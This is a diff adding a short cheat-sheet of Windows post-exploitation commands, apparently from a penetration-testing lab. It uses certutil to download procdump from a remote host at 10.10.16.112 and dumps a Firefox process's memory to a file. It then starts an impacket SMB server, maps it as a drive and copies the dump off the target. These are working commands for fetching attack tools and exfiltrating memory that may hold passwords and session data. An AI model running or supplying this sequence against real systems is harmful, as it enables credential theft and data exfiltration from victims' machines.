@@ -1,0 +1,12 @@
+certutil -urlcache -split -f http://10.10.16.112/procdump.exe procdump.exe
+
+certutil -urlcache -split -f http://10.10.16.112/procdump64.exe procdump64.exe
+
+cmd /c procdump.exe -accepteula -ma 7008
+
+#Copy big file from windows to linux
+python /opt/impacket/examples/smbserver.py test . -smb2support -username guest -password guest 
+
+
+net use x: \\10.10.16.112\test /user:guest guest
+cmd /c "copy firefox.exe_200131_084937.dmp x:\"
